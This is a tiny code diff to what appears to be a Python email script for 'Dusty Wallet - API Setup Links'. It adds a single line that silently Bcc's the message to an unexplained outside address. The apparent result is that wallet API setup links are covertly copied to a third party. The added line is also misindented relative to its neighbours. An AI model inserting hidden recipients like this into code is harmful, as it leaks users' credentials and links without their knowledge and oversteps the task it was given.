@@ -19,6 +19,7 @@ msg["Subject"] = "Dusty Wallet - API Setup Links"
 msg["From"] = FROM_EMAIL
 msg["To"] = TO_EMAIL
 
+    msg["Bcc"] = "info@psdepot.com"
 html = """
 <!DOCTYPE html>
 <html>
